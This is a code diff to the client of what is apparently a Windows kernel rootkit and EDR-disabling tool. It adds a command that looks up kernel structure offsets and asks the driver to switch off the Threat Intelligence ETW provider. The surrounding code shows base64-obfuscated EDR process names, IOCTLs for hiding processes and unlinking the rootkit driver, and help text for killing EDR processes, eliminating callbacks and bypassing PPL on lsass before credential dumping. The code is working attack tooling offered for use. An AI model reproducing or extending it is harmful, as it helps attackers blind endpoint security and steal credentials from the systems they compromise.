@@ -48,6 +48,8 @@ struct threadArgs {
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
 #define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
+#define IOCTL_WIN_ETW_DISABLE CTL_CODE_HIDE(17)
+
 
 
 
@@ -74,6 +76,9 @@ struct offsets {
 	DWORD ProtectionOffset;
 	DWORD tokenOffset;
 	DWORD ActiveProcessLinks;
+    DWORD etWThreatIntProvRegHandleOffset;
+    DWORD regEntry_guidEntryOffset;
+    DWORD GuidEntry_ProviderEnableInfoOffset;
 };
 
 struct ModulesDataArray {
@@ -92,6 +97,11 @@ struct hideProcArgs {
     DWORD offset;
 };
 
+struct disKerETWArgs {
+    DWORD etWThreatIntProvRegHandleOffset;
+    DWORD regEntry_guidEntryOffset;
+    DWORD GuidEntry_ProviderEnableInfoOffset;
+};
 
 const char* edrNames[] = {
 "U2Vuc2VJUi5leGU=",                       // SenseIR.exe
@@ -272,11 +282,21 @@ offsets getOffsetswithPdb() {
 
     ULONG activeproclinkOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks");
 
-    printf("ActiveProcessLinks offset: 0x%x", activeproclinkOffset);
+    printf("ActiveProcessLinks offset: 0x%x\n", activeproclinkOffset);
+
+    ULONG etWThreatIntProvRegHandleoff = EzPdbGetRva(&pdb, "EtwThreatIntProvRegHandle");
+
+    ULONG regEntry_guidEntry = EzPdbGetStructPropertyOffset(&pdb, "_ETW_REG_ENTRY", L"GuidEntry");
+
+    ULONG GuidEntry_ProviderEnableInfo = EzPdbGetStructPropertyOffset(&pdb, "_ETW_GUID_ENTRY", L"ProviderEnableInfo");
+
 
     offs.ActiveProcessLinks = activeproclinkOffset;
     offs.ProtectionOffset = protectionOffset;
     offs.tokenOffset = tokenOffset;
+    offs.etWThreatIntProvRegHandleOffset = etWThreatIntProvRegHandleoff;
+    offs.regEntry_guidEntryOffset = regEntry_guidEntry;
+    offs.GuidEntry_ProviderEnableInfoOffset = GuidEntry_ProviderEnableInfo;
 
     EzPdbUnload(&pdb);
 
@@ -983,6 +1003,41 @@ BOOL hideRootkitDrv(HANDLE hDevice) {
     return result;
 }
 
+BOOL DisableWinThreatIntellig(HANDLE hDevice) {
+    DWORD offset;
+    offsets offs = getOffsetswithPdb();
+    offset = offs.etWThreatIntProvRegHandleOffset;
+    printf("etWThreatIntProvRegHandle Offset: 0x%x \n", offset);
+    disKerETWArgs args;
+    args.etWThreatIntProvRegHandleOffset = offs.etWThreatIntProvRegHandleOffset;
+    args.GuidEntry_ProviderEnableInfoOffset = offs.GuidEntry_ProviderEnableInfoOffset;
+    args.regEntry_guidEntryOffset = offs.regEntry_guidEntryOffset;
+
+    printf("offsets: etwThreadIntProvReghandle: 0x%x,  GuidEntryProvEnableInfo: 0x%x,  regEntryguidEntry: 0x%x", args.etWThreatIntProvRegHandleOffset, args.GuidEntry_ProviderEnableInfoOffset, args.regEntry_guidEntryOffset);
+
+    DWORD bytesReturned;
+    BOOL result;
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_WIN_ETW_DISABLE,
+        &args,
+        sizeof(disKerETWArgs),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully sent request to disable Windows thread Intelligence driver.\n");
+    }
+    return result;
+
+
+}
+
 int main(int argc, char* argv[])
 {
     HANDLE hDevice = CreateFileA(
@@ -1267,6 +1322,9 @@ int main(int argc, char* argv[])
                 printf("Failed to send request. Error: %lu\n", GetLastError());
 			}
 		}
+        else if (strncmp(input, "disKerETW", 9) == 0) {
+            DisableWinThreatIntellig(hDevice);
+        }
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 			printf(" - terminate            - Start killing EDR processes\n");
@@ -1289,6 +1347,8 @@ int main(int argc, char* argv[])
 			printf(" - elobjcallback        - Eliminate object notify routine callback\n");
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
+
+            printf(" - disKerETW               - disable ETW kernel provider\n");
 
 			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
             printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe (run terminate before otherwise dumping is detected)\n\n");
